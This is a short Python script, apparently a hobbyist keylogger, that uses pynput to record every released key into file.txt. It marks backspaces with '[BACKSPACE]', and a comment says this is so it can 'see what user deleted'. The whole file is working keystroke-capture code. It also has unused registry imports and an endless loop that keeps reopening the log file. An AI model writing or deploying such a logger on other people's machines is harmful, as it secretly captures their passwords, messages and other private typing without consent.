from ast import Delete
from winreg import DeleteKey, DeleteValue
from pynput import keyboard


def on_release(key):
    print(key)

    #function to print out space instead of spacebar keypress
    if key == keyboard.Key.space:
        key = " "
    # replaces ENTER keyevent with new line    
    elif key == keyboard.Key.enter:
        key ="\n"
    # replaces BACKSPACE keyevent with backspace note....
    #  to see what user deleted
    elif key == keyboard.Key.backspace:
        key = "[BACKSPACE]"
        # key ="\b"
           

    #remove single quote from each letter
    f.write(str(key).replace("'", ""))

# event listener on key press release:
listener = keyboard.Listener(on_release = on_release)
listener.start()

#open file.txt with read/write permission
f = open("file.txt","a")

while True:
    i = 0
    f = open("file.txt", "a")
    
